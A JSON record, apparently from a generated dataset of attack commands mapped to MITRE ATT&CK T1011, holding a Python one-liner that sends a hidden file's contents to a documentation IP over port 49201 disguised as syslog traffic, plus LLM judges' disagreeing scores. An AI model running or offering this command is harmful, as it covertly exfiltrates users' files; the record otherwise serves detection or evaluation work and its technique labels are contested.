@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,datetime; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"198.51.100.23\", 49201)); prefix=(\"<34>1 \"+datetime.datetime.utcnow().isoformat()+\"Z macos app - - - \").encode(); s.sendall(prefix+open(\"/Users/Shared/.slog\",\"rb\").read()); s.close()'",
+  "explanation": "Exfiltrates data disguised as syslog-like messages over a non-standard TCP port, using a logging-style medium distinct from a primary C2 path, aligning with T1011.",
+  "rationale_steps": [
+    "Create a TCP socket to an uncommon port (49201) on a documentation IP.",
+    "Prefix content with a syslog-like header to mimic a different network medium.",
+    "Send file bytes as payload over the alternate logging channel.",
+    "No obfuscation employed; user-space only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-36b5070d",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Python one-liner with balanced quoting/parentheses and correct use of socket and file operations.",
+        "semantic_score": 2,
+        "semantic_justification": "It exfiltrates a file over TCP with a syslog-like header, but this is not a different network medium (e.g., cellular/Bluetooth) as required by T1011.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T01:23:46.815092Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for importing modules, creating a socket connection, formatting data, and sending file contents.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1011 by exfiltrating data from a hidden file over a non-standard TCP port (49201) using a socket connection disguised as syslog messages, which could evade detection on a monitored primary network.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T01:23:52.752127Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes, correct method calls, and valid syntax for socket operations and file reading.",
+        "semantic_score": 2,
+        "semantic_justification": "The command performs data exfiltration with a disguise, but it uses standard TCP/IP over the primary network interface, which does not align with T1011's specific focus on *different network mediums* like cellular, Wi-Fi (distinct from primary), or Bluetooth.",
+        "combined_score": 3.5,
+        "confidence": 1.0,
+        "timestamp": "2025-10-01T06:30:27.318855Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
